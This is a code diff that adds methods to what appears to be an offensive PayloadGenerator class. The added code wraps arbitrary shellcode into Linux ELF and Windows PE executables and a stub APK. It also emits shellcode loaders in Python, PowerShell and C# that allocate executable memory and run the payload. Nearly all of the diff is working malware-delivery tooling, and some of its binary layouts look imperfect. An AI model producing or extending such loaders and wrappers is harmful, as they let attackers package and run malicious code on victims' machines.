@@ -121,4 +121,160 @@ class PayloadGenerator:
             loader = b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
             return loader + shellcode
 
-    def
+    def _to_elf(self, shellcode: bytes, **kwargs) -> bytes:
+        """Wrap shellcode in Linux ELF executable"""
+        # ELF64 header for x86_64
+        elf_header = bytes([
+            0x7f, 0x45, 0x4c, 0x46,  # Magic
+            0x02, 0x01, 0x01, 0x00,  # 64-bit, little-endian
+            0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,
+            0x02, 0x00, 0x3e, 0x00,  # Type: EXEC, Machine: x86_64
+            0x01, 0x00, 0x00, 0x00,  # Version
+            0x78, 0x00, 0x40, 0x00,  # Entry point
+            0x00, 0x00, 0x00, 0x00,  # Program header offset
+            0x00, 0x00, 0x00, 0x00,  # Section header offset
+            0x00, 0x00, 0x00, 0x00,  # Flags
+            0x40, 0x00,              # ELF header size
+            0x38, 0x00,              # Program header entry size
+            0x01, 0x00,              # Number of program headers
+            0x40, 0x00,              # Section header entry size
+            0x00, 0x00,              # Number of section headers
+            0x00, 0x00               # Section name string table index
+        ])
+
+        # Program header for LOAD segment
+        phdr = bytes([
+            0x01, 0x00, 0x00, 0x00,  # Type: LOAD
+            0x05, 0x00, 0x00, 0x00,  # Flags: R-X
+            0x00, 0x00, 0x00, 0x00,  # Offset
+            0x00, 0x00, 0x40, 0x00,  # Virtual address
+            0x00, 0x00, 0x40, 0x00,  # Physical address
+        ])
+
+        # Size fields
+        file_size = len(elf_header) + len(phdr) + len(shellcode) + 0x100
+        mem_size = file_size
+
+        phdr += struct.pack("<Q", file_size)
+        phdr += struct.pack("<Q", mem_size)
+        phdr += struct.pack("<Q", 0x1000)  # Alignment
+
+        # Pad to entry point
+        padding = b"\x00" * (0x78 - len(elf_header) - len(phdr))
+
+        return elf_header + phdr + padding + shellcode
+
+    def _to_apk(self, shellcode: bytes, **kwargs) -> bytes:
+        """Embed shellcode in Android APK"""
+        # Return DEX-like structure with native lib
+        # Full APK would require aapt2, this is a stub
+        dex_header = b"dex\n035\x00"
+        return dex_header + shellcode
+
+    def _to_python(self, shellcode: bytes) -> bytes:
+        """Generate Python loader for shellcode"""
+        sc_str = ",".join(str(b) for b in shellcode)
+        code = f"""#!/usr/bin/env python3
+import ctypes
+import os
+
+shellcode = bytes([{sc_str}])
+
+# Allocate executable memory
+size = len(shellcode)
+ptr = ctypes.c_void_p(ctypes.pythonapi.valloc(size))
+ctypes.pythonapi.mprotect(ptr, size, 0x7)
+
+# Copy shellcode
+ctypes.memmove(ptr, shellcode, size)
+
+# Create function pointer and call
+sc_func = ctypes.CFUNCTYPE(None)(ptr)
+sc_func()
+"""
+        return code.encode()
+
+    def _to_powershell(self, shellcode: bytes) -> bytes:
+        """Generate PowerShell loader"""
+        b64 = shellcode.hex()
+        code = f"""$shellcode = [Byte[]] @({','.join(str(b) for b in shellcode)})
+$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
+$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])
+$func.Invoke()
+"""
+        return code.encode()
+
+    def _to_csharp(self, shellcode: bytes) -> bytes:
+        """Generate C# loader"""
+        hex_str = "".join(f"\\x{b:02x}" for b in shellcode)
+        code = f"""using System;
+using System.Runtime.InteropServices;
+
+class Program {{
+    [DllImport("kernel32")]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    static void Main() {{
+        byte[] shellcode = new byte[] {{ {",".join(str(b) for b in shellcode)} }};
+        IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
+        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
+        CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
+    }}
+}}
+"""
+        return code.encode()
+
+    def _build_minimal_pe(self, shellcode: bytes) -> bytes:
+        """Build minimal PE file"""
+        dos_header = b"\x4d\x5a" + b"\x00" * 58 + struct.pack("<I", 0x40)
+        pe_sig = b"PE\x00\x00"
+
+        # COFF header
+        coff = struct.pack("<HHI", 0x8664, 1, 0)
+        coff += struct.pack("<II", 0, 0)
+        coff += struct.pack("<H", 0x20)
+        coff += struct.pack("<H", 0x1022)
+
+        # Optional header (PE32+)
+        opt_hdr = struct.pack("<H", 0x20b)
+        opt_hdr += b"\x00" * 38
+        opt_hdr += struct.pack("<Q", 0x10000)
+        opt_hdr += struct.pack("<I", 0x1000)
+        opt_hdr += struct.pack("<I", 0x200)
+        opt_hdr += b"\x00" * 24
+        opt_hdr += struct.pack("<I", 0)
+        opt_hdr += struct.pack("<I", 0x2000)
+        opt_hdr += struct.pack("<I", len(dos_header) + len(pe_sig) + len(coff) + 0x20)
+        opt_hdr += struct.pack("<I", 0)
+        opt_hdr += struct.pack("<H", 1)
+        opt_hdr += struct.pack("<H", 0)
+        opt_hdr += struct.pack("<Q", 0x100000)
+        opt_hdr += struct.pack("<Q", 0x1000)
+        opt_hdr += struct.pack("<Q", 0x100000)
+        opt_hdr += struct.pack("<Q", 0x1000)
+        opt_hdr += struct.pack("<I", 0)
+        opt_hdr += struct.pack("<I", 16)
+        opt_hdr += b"\x00" * 128
+
+        # Section header
+        sect_name = b".text\x00\x00\x00"
+        sect_hdr = sect_name
+        sect_hdr += struct.pack("<I", len(shellcode))
+        sect_hdr += struct.pack("<I", 0x1000)
+        sect_hdr += struct.pack("<I", len(shellcode))
+        sect_hdr += struct.pack("<I", len(dos_header) + len(pe_sig) + len(coff) + len(opt_hdr) + 0x28)
+        sect_hdr += struct.pack("<I", 0)
+        sect_hdr += struct.pack("<I", 0)
+        sect_hdr += struct.pack("<H", 0)
+        sect_hdr += struct.pack("<H", 0)
+        sect_hdr += struct.pack("<I", 0x60000020)
+
+        header_size = len(dos_header) + len(pe_sig) + len(coff) + len(opt_hdr) + len(sect_hdr)
+        pad_size = (0x200 - (header_size % 0x200)) % 0x200
+
+        return dos_header + pe_sig + coff + opt_hdr + sect_hdr + b"\x00" * pad_size + shellcode
